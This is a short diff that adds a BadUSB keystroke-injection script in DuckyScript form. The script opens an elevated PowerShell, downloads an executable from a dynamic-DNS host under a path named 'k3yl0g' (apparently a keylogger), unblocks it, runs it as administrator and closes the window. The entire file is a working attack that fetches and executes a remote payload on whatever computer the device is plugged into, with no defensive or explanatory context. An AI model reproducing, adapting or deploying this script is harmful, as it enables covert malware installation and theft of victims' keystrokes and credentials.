@@ -1,0 +1,25 @@
+GUI r
+DELAY 855
+STRING powershell
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 500
+STRING cd c:/
+DELAY 500
+ENTER
+DELAY 500
+STRING curl.exe -o "C:\sysnet.exe" "http://MonDDNS.ddns.net/k3yl0g/sysnet.exe"
+DELAY 500
+ENTER
+DELAY 3500
+STRING Unblock-File -Path "C:\sysnet.exe"
+DELAY 500
+ENTER
+DELAY 800
+STRING Start-Process -FilePath "C:\sysnet.exe" -Verb RunAs
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 500
+ENTER
